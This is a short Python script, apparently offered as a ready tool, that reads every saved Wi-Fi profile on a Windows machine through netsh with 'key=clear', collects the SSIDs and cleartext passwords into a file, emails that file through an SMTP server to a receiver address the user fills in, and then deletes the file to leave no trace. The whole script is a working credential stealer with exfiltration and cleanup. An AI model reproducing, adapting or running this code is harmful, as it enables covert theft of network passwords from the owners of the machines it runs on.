#####################################
# Coded by Sercan Yılmaz
# Contact: bilgi@sercanyilmaz.com.tr
#####################################
import os, re
import smtplib
import time

def get_wlans():
    data = os.popen("netsh wlan show profiles").read()
    wifi = re.compile("All User Profile\s*:.(.*)")
    return wifi.findall(data)

def get_pass(network):
    try:
        wlan = os.popen("netsh wlan show profile "+str(network.replace(" ","*"))+" key=clear").read()
        pass_regex = re.compile("Key Content\s*:.(.*)")
        return pass_regex.search(wlan).group(1)
    except:
        return " "

with open("clear.txt","w") as f:
    for wlan in get_wlans():
        f.write("\n SSID : "+wlan + " Password : " + get_pass(wlan))
    f.close()

sender = "SENDER MAIL ADDRESS HERE" #CHANGE THIS
reciever = "RECIEVER MAIL ADDRESS HERE" #CHANGE THIS
mess = open("clear.txt", "rb")
message = mess.read()
with smtplib.SMTP(host = "mail.yourdomain.com", port = 587) as server: #If you prefer to use gmail, you have to change settings for less secure applications...
    time.sleep(1)
    server.login("SENDER MAIL ADDRESS", "SENDER MAIL PASSWORD") #CHANGE THIS
    server.sendmail(sender, reciever, message)

time.sleep(1)
def delete():
	command1 = "del clear.txt"
	process = os.popen(command1)
delete()
